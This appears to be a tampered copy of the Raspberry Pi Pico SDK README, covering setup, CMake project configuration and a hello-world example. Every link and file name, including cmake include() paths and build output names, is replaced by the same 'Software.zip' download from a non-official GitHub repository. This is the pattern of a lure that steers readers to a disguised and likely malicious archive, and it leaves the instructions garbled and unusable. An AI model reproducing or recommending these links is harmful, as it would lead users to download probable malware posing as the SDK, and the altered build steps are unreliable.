# Raspberry Pi Pico SDK

The Raspberry Pi Pico SDK (henceforth the SDK) provides the headers, libraries and build system
necessary to write programs for the RP2040-based devices such as the Raspberry Pi Pico
in C, C++ or assembly language.

The SDK is designed to provide an API and programming environment that is familiar both to non-embedded C developers and embedded C developers alike.
A single program runs on the device at a time and starts with a conventional `main()` method. Standard C/C++ libraries are supported along with
C level libraries/APIs for accessing all of the RP2040's hardware include PIO (Programmable IO).

Additionally the SDK provides higher level libraries for dealing with timers, synchronization, USB (TinyUSB) and multi-core programming
along with various utilities.

The SDK can be used to build anything from simple applications, to fully fledged runtime environments such as MicroPython, to low level software
such as RP2040's on-chip bootrom itself.

Additional libraries/APIs that are not yet ready for inclusion in the SDK can be found in [pico-extras](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip).

# Documentation

See [Getting Started with the Raspberry Pi Pico](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip) for information on how to setup your
hardware, IDE/environment and for how to build and debug software for the Raspberry Pi Pico
and other RP2040-based devices.

See [Raspberry Pi Pico C/C++ SDK](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip) to learn more about programming using the
SDK, to explore more advanced features, and for complete PDF-based API documentation.

See [Online Raspberry Pi Pico SDK API docs](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip) for HTML-based API documentation.

# Example code

See [pico-examples](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip) for example code you can build.

# Quick-start your own project

These instructions are extremely terse, and Linux-based only. For detailed steps,
instructions for other platforms, and just in general, we recommend you see [Raspberry Pi Pico C/C++ SDK](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip)

1. Install CMake (at least version 3.13), and GCC cross compiler
   ```
   sudo apt install cmake gcc-arm-none-eabi libnewlib-arm-none-eabi libstdc++-arm-none-eabi-newlib
   ```
1. Set up your project to point to use the Raspberry Pi Pico SDK

   * Either by cloning the SDK locally (most common) :
      1. `git clone` this Raspberry Pi Pico SDK repository
      1. Copy [https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip)
         from the SDK into your project directory
      2. Set `PICO_SDK_PATH` to the SDK location in your environment, or pass it (`-DPICO_SDK_PATH=`) to cmake later.
      3. Setup a `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip` like:

          ```cmake
          cmake_minimum_required(VERSION 3.13)

          # initialize the SDK based on PICO_SDK_PATH
          # note: this must happen before project()
          include(https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip)

          project(my_project)

          # initialize the Raspberry Pi Pico SDK
          pico_sdk_init()

          # rest of your project

          ```

   * Or with the Raspberry Pi Pico SDK as a submodule :
      1. Clone the SDK as a submodule called `pico-sdk`
      1. Setup a `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip` like:

          ```cmake
          cmake_minimum_required(VERSION 3.13)

          # initialize pico-sdk from submodule
          # note: this must happen before project()
          include(https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip)

          project(my_project)

          # initialize the Raspberry Pi Pico SDK
          pico_sdk_init()

          # rest of your project

          ```

   * Or with automatic download from GitHub :
      1. Copy [https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip)
         from the SDK into your project directory
      1. Setup a `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip` like:

          ```cmake
          cmake_minimum_required(VERSION 3.13)

          # initialize pico-sdk from GIT
          # (note this can come from environment, CMake cache etc)
          set(PICO_SDK_FETCH_FROM_GIT on)

          # https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip is a single file copied from this SDK
          # note: this must happen before project()
          include(https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip)

          project(my_project)

          # initialize the Raspberry Pi Pico SDK
          pico_sdk_init()

          # rest of your project

          ```

   * Or by cloning the SDK locally, but without copying `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip`:
       1. `git clone` this Raspberry Pi Pico SDK repository
       2. Setup a `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip` like:

           ```cmake
           cmake_minimum_required(VERSION 3.13)
 
           # initialize the SDK directly
           include(https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip)
 
           project(my_project)
 
           # initialize the Raspberry Pi Pico SDK
           pico_sdk_init()
 
           # rest of your project
 
           ```
1. Write your code (see [pico-examples](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip) or the [Raspberry Pi Pico C/C++ SDK](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip) documentation for more information)

   About the simplest you can do is a single source file (e.g. hello_world.c)

   ```c
   #include <stdio.h>
   #include "pico/stdlib.h"

   int main() {
       setup_default_uart();
       printf("Hello, world!\n");
       return 0;
   }
   ```
   And add the following to your `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip`:

   ```cmake
   add_executable(hello_world
       hello_world.c
   )

   # Add pico_stdlib library which aggregates commonly used features
   target_link_libraries(hello_world pico_stdlib)

   # create map/bin/hex/uf2 file in addition to ELF.
   pico_add_extra_outputs(hello_world)
   ```

   Note this example uses the default UART for _stdout_;
   if you want to use the default USB see the [hello-usb](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip) example.


1. Setup a CMake build directory.
      For example, if not using an IDE:
      ```
      $ mkdir build
      $ cd build
      $ cmake ..
      ```

1. Make your target from the build directory you created.
      ```sh
      $ make hello_world
      ```

1. You now have `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip` to load via a debugger, or `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip` that can be installed and run on your Raspberry Pi Pico via drag and drop.
